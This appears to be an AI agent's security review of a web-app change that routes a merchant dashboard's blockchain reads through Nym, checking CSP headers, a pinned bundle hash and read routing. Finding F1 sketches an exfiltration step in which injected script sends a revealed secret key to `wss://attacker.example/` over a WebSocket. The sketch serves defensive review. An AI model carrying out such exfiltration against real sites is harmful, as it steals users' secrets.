VERDICT: PASS

# Security review: 018-P4-web-private-reads, round 1 (reviewer-security)

This batch runs in phase mode with Money: yes (PIPELINE §3b), so only HIGH or CRITICAL findings block. I found none. The /merchant CSP adds exactly the hosts the human approved at 08:52, plus `blob:` in connect-src, which opens no network path. The customer routes and /docs are byte-for-byte unchanged. The Nym bundle is still hash-checked against the pinned hash before a byte of it runs. Writes never touch Nym, and no Nym answer can raise what the merchant signs or approves. The meter is in-memory and its counts are honest. One MEDIUM item, the loosened policy on the page that reveals one-time secrets, plus LOW and INFO items are under FOLLOW-UP.

## What was checked
- **Diff:** `git diff -- apps/web` (5 modified files) plus the three new files (`lib/read-meter.ts`, `components/dashboard/PrivateReads.tsx`, `test/read-meter.test.mjs`). Context: 005 round-2 F8 and F-N4, `lib/anon.ts`, and the harness source in `node_modules/@anon-rpc/{browser-harness,harness-core}` (src and dist).
- **Tests:** I ran `npm test` in a scratch copy with `.env*` excluded (0 env files in the copy). Result: **423 tests, 421 pass, 0 fail, 2 skipped.**
- **Mutations** (scratch copy only; `merchant-wallet` and `read-meter` tests, baseline 18/18):
  - **Killed:**
    - M1: every Nym error falls back, including reverts;
    - M3: the wallet client's writes routed through `readVia`;
    - M4: a read counted private before Nym answers;
    - M5: Nym never used;
    - M7: the approval raised to max uint.
  - **Survived:**
    - M2: `withDeadline` removed;
    - M6: the fallback made non-sticky.
  - Both survivors are test gaps (F2). Neither has a money effect.
- **Headers:** read-only `curl -D -` on :3100, a production build (no `'unsafe-eval'`), across 13 routes (below). I did not restart the server.
- **Nym directory:** one read-only GET of `validator.nymtech.net/api/v1/unstable/nym-nodes/skimmed/entry-gateways/all` at 09:29, saved to its own scratch folder and parsed with jq. It lists 629 entry gateways; 555 have a WSS hostname, spread over **56 registrable domains**, all on port 9001.

## Check 1: the /merchant CSP (`next.config.ts:29-34, 54, 57`)
- **connect-src** on :3100 /merchant is `'self' blob: https://ethereum-rpc.publicnode.com https://cdn.jsdelivr.net https://unpkg.com https://raw.githubusercontent.com https://validator.nymtech.net wss:`. These are exactly the approved hosts. The one extra is `blob:` (F6), which reaches no network.
- **script-src** is `'self' 'unsafe-inline' 'wasm-unsafe-eval' blob:`, and `worker-src blob:` is appended. No CDN host appears in script-src, so all JS the dashboard runs is still served from our origin (F8 holds). The only third-party code is the Nym bundle. It runs in a Web Worker inside a `sandbox="allow-scripts"` iframe with a null origin (`AnonRpcWorker.ts:127,135`), so it has no access to the DOM, `window.ethereum`, cookies or localStorage. It talks to us only through the capability port: fetch answers, KPS, namespaced IndexedDB and logs.
- **Is `blob:` in script-src safe?** It is needed: the srcdoc iframe inherits this policy, and the worker runtime loads the bundle with `importScripts(blob:)` (`worker-runtime.ts:58-60`), which script-src governs.
  - It adds no attack surface. A blob URL belongs to the origin and partition that minted it, so a foreign page's blob can't be loaded here.
  - To get a `<script src="blob:…">` of its own to run, an attacker must already be executing JS in our origin or injecting HTML. `'unsafe-inline'` already turns either of those into execution, so `blob:` gives them nothing new.
  - Our main document never makes a blob from untrusted bytes and runs it. The harness's blobs live in the null-origin iframe and worker, and the host-side `blob:` resolver fetch is hash-checked.
  - The same reasoning applies to `'wasm-unsafe-eval'`: it allows compiling WebAssembly, not running JS strings, and it needs existing execution to matter.
- **`wss:` (any host):** acceptable as approved, but it can't be narrowed usefully in this document.
  - Nym picks its entry gateway from the live directory: 555 WSS hosts on 56 operator domains, which churn. A host list would break boots whenever the chosen gateway falls outside it.
  - `wss://*:9001` would narrow only the port, and an attacker can listen on 9001 too.
  - The worker's config has no setting that pins the entry gateway (`preferredIpr` picks the exit).
  - The real narrowing is to move `wss:` into the iframe's own policy (F1 option b).
- **/merchant/pages:** `img-src 'self' data: https:` plus the merchant policy. One CSP header (`:57` comes last, so it wins).
- **Unchanged routes** (the `git show HEAD:apps/web/next.config.ts` rules match the curl output):
  - `/checkout/x`, `/pay/1`, `/r/1`, `/l/x`, `/counter/x` (404, header present) and `/docs` all send the strict PAY_PAGE_CSP: `connect-src 'self'`, `script-src 'self' 'unsafe-inline'`.
  - `/p/x` sends the strict policy with `img-src https:`.
  - `/` and `/proofs` send no CSP, as before.
  - Every route sends `X-Frame-Options: DENY`.
- **005 F-N4 (soft navigation skips the CSP):** fixed. Nothing uses `next/link` to reach `/merchant`: the landing page, Nav and /docs use plain `<a>`, and the three `<Link>`s that remain go to `/` and `/r/*`. The chip's `/proofs` link is a plain `<a>` too (`PrivateReads.tsx:83`).

## Check 2: the pinned worker hash (`lib/anon.ts:14, 27-39, 48-55`)
Still enforced, with no gap between check and use.
- The harness reads `workerHash()` as `eth_call {to, data: "0x3898587d"}` (`harness-core/src/specifier.ts:44,52-56`). That selector matches `toFunctionSelector('workerHash()')`, so `pinWorkerHash` sees the call and throws on anything but the pinned value. It also fails closed on a non-string or over-long return.
- The new `countRead("setup")` wrapper sits inside `pinWorkerHash`, so the pin still checks the bootstrap's answer.
- `fetchAndVerifyBundle` hashes the downloaded bytes and rejects any mirror whose hash differs (`specifier.ts:131-137`; the same check is in `dist/specifier.js:82`). The host posts exactly those verified bytes to the iframe (`AnonRpcWorker.ts:119,157-161`), and the worker runs only what it was posted.
- A hostile mirror, or a bootstrap that lies about the URL list, can't swap the code.
- `test/anon.test.mjs:52-65` covers the pin and is green.
- Residual: the resolver list itself isn't pinned (F5, INFO).

## Check 3: read routing (`lib/merchant-wallet.ts:63-112, 117, 126`)
- **Writes never go through Nym.**
  - The wallet client is `custom(provider)` directly (`:117`). In viem 2.57.13, `writeContract` for a JSON-RPC account sends only `eth_chainId` and `eth_sendTransaction` (`actions/wallet/sendTransaction.ts:221-265`).
  - Gas, nonce and fees are worked out inside the wallet.
  - `readVia` is used only for the reader (`:126`), and the reader is used only for simulate, read and receipt calls.
  - The test at `merchant-wallet.test.mjs` "once Nym is ready…" asserts that Nym saw only read methods and that both `eth_sendTransaction` calls went to the wallet; M3 is killed.
- **A Nym answer can't change what is signed.**
  - `simulateContract` builds `request` from our own inputs (abi, address, args, functionName, account; `viem/actions/public/simulateContract.ts:297-305`). The RPC supplies only `result`.
  - The refund amount is what the merchant types, bounded by `refundable`, which the server read from `payments(id)` for this render (`components/merchant/Refund.tsx:17,56`). MerchantPay re-checks it on chain.
  - The approval is exactly `amount` (`:169`; M7 is killed).
- **A wrong balance or allowance from Nym** (from Ankr, or from the Nym exit if the worker doesn't verify TLS; that is unverified, because the WASM isn't in the repo):
  - **Allowance reported low:** one extra approve of exactly the refund amount. That costs gas, and it can only lower an existing larger allowance.
  - **Allowance or balance reported high:** the approve is skipped or wasted, and the refund then fails the wallet's own gas estimate. That costs gas or a warning, and nothing moves.
  - **Balance reported low:** the refund is refused. That is denial of service only.
  - **A forged receipt:** a false "done", or a wrong invoice id in the "created" banner and its local note. `router.refresh()` then shows the server's chain-read truth, and `/pay` re-reads the invoice on the server, so no payment can be steered to anyone else.
  - **Bottom line:** no lie can make the merchant approve more than the refund being made. The worst a lying RPC can cost is gas, and the wallet's RPC already had the same power before this batch.
- **The 10 s fallback (`:59, 80-86, 96-106`):**
  - A hang or transport failure (`HttpRequestError`/`TimeoutError`; viem wraps every `fetchFn` throw) goes to the wallet for that read, and later reads stay on the wallet for the rest of the page (`:104`).
  - The orphaned Nym call is aborted by the anon client's own 60 s timeout.
  - A revert is treated as an answer, so it stays private and is not asked twice.
  - The `TimeoutError` body is `{}` and its URL is the label "Anon-RPC", so nothing leaks, and the error is swallowed, never shown.
  - The deadline and the stickiness are untested (F2). Non-revert JSON-RPC errors don't fall back (F3).

## Check 4: the meter (`lib/read-meter.ts`, `PrivateReads.tsx`, `Shell.tsx:24`)
- **Nothing leaks.** It is module memory only: no fetch, no storage, no console, no URL. The chip shows three integers and a status. The server snapshot is all zeros.
- **Only signed-in merchants boot Nym.** The chip, and with it the boot, renders only when `account` is set. Signed-out /merchant never starts Nym.
- **The counts are honest:**
  - "private" is counted only after Nym returns an answer, including a revert (M4 is killed);
  - "plain" is counted for every read sent to the wallet, during the boot, after a failure, and after the deadline;
  - a Nym read that never answered isn't counted private;
  - the bootstrap lookups are counted apart as "setup" and named in the panel;
  - the text "Sending still goes through your wallet" covers the wallet's own traffic.
- The CDN and `validator.nymtech.net` fetches are setup traffic, not chain reads, so they aren't counted. That is reasonable, since the meter measures chain reads.

## Check 5: secrets grep
`grep -nE '(PRIVATE_KEY|SECRET|0x[0-9a-fA-F]{64})' --exclude='.env*'` over the 8 diff files plus this batch's markdown:
- **1 hit:** `apps/web/lib/anon.ts:14` `NYM_WORKER_HASH = "0xf13a448a…1fceb8"`. This is the public keccak256 of the Nym bundle (the on-chain `workerHash()` value, also in ARCHITECTURE §4). It is not a key, and the line predates this diff.
- I read no `.env*` file. The changed files read only `process.env.NODE_ENV` (`next.config.ts:9`).

## FOLLOW-UP (none blocks)

### F1 MEDIUM: the loosened policy also covers /merchant/developers, which reveals one-time secrets (owner: claude-frontend)
- **Where:** `next.config.ts:54`. The merchant rule `/merchant/:path*` also matches `/merchant/developers`. That page shows a new secret API key (`components/gateway/ApiKeys.tsx:49`) and a webhook signing secret (`components/gateway/Webhooks.tsx:56,107`) once, in the browser.
- **Sketch:**
  1. Any script that runs in our origin, through an XSS or a malicious first-party dependency, reads the revealed value from the DOM.
  2. It opens `new WebSocket("wss://attacker.example/")` (now allowed) and sends the value silently.
  3. Before this batch, `connect-src 'self'` blocked that. Only a visible navigation could leak it.
- **Why it isn't HIGH:** it needs code execution first. I found no injection sink: no `dangerouslySetInnerHTML`, React 19 escaping, and links built from our own routes. The Nym worker can't read the page.
- **Fix, either:**
  - **(a) quick:** add `{ source: "/merchant/developers", headers: csp }` after the merchant rule (the last match wins, as with /merchant/pages). Pass a Shell prop so the chip isn't rendered there; the page makes no chain reads, and without the prop the chip would show "off".
  - **(b) full:** pass `iframeUrl: "/anon-rpc-iframe.html"` (the harness supports this; README "Strict Content Security Policies"). Serve that one page with its own CSP (`script-src 'self' blob: 'wasm-unsafe-eval'; worker-src blob:; connect-src validator.nymtech.net wss:`) and `X-Frame-Options: SAMEORIGIN` with `frame-ancestors 'self'` for that path only. Then `/merchant/*` drops `wss:`, `validator.nymtech.net`, `blob:` and `'wasm-unsafe-eval'`, and keeps only publicnode and the three mirrors, which the host itself fetches.

### F2 LOW: the 10 s deadline and the sticky fallback are untested (owner: claude-frontend)
- **Where:** `lib/merchant-wallet.ts:96` (`withDeadline`) and `:104` (`privateReads = undefined`). Mutants M2 (deadline removed) and M6 (fallback not sticky) both pass all 18 tests.
- **Impact:** without the deadline, a hung Nym read waits for the anon client's 60 s timeout. Without the stickiness, every read on a dead Nym pays the failure again. That is the NFR-13 "never blocks a refund" promise, not a money effect.
- **Fix:** add one test with a `FakeWorker.fetch` that never settles and `mock.timers.enable({ apis: ["setTimeout"] })`. Advance 10 s, then assert that the read was answered by the wallet, was counted plain, that the status is "failed", and that the next read skips Nym.

### F3 LOW: a non-revert JSON-RPC error through Nym is final, not a fallback (owner: claude-frontend)
- **Where:** `lib/merchant-wallet.ts:100`. Every error other than `HttpRequestError` or `TimeoutError` is counted private and rethrown.
- **Sketch:** Ankr answers Nym exits with HTTP 200 and `{"error":{"code":-32005,"message":"rate limit"}}`, which viem turns into an `RpcRequestError`. Every dry run then fails with "Your wallet couldn't send this…", and the refund is blocked until reload, even though the wallet's RPC would answer.
- **Fix:** treat only reverts as answers: `RpcRequestError` with code 3, or `-32000` with "revert" in its details. Send everything else to the wallet like a transport failure.

### F4 INFO: trust in read answers moves from the wallet's RPC to Ankr via Nym
This is check 3 in short: a lying or stale read costs gas at worst, and can't redirect or enlarge anything that is signed. One thing is unverified: whether the Nym WASM checks rpc.ankr.com's TLS certificate itself, which decides whether a Nym exit could forge answers. Worth one line in the Nym review notes. No code change needed.

### F5 INFO: `workerResolvers()` isn't pinned (owner: claude-frontend, optional)
- **Where:** `lib/anon.ts:27-39` pins only the hash.
- **Sketch:** publicnode, or a specifier owner calling `setWorker`, can list `kps:` entries. The host dials those over WebRTC (`kps-bridge-host.ts`), which the CSP doesn't cover, so an attacker-chosen peer learns that this IP boots Nym. Publicnode and the CDNs already see that IP. Alternatively, it can list 64 MB bodies on an allowed mirror (`MAX_BUNDLE_BYTES`), which are hashed on the main thread.
- **What can't happen:** the code can't be swapped.
- **Fix, if wanted:** in `pinWorkerHash`, compare the `0x1c67ff29` (`workerResolvers()`) result to a pinned hex constant, the same way the hash is compared.

### F6 INFO: `blob:` in connect-src, and Firefox
- **`blob:` in connect-src** (`next.config.ts:32`) isn't in the human's named list, but it reaches no network: a blob URL holds data the page already has. Keep it, or drop it if the live boot still reaches "ready" without it.
- **Firefox:** the harness needs `data:` in script-src there (README). Our policy doesn't allow it, so Firefox fails closed to plain reads. Don't add `data:` without another security pass.

## NEEDS THE USER
Nothing new. The human approved the host list at 08:52. F1 (a) or (b) only narrows that approval, so the lane can take either without a new decision.
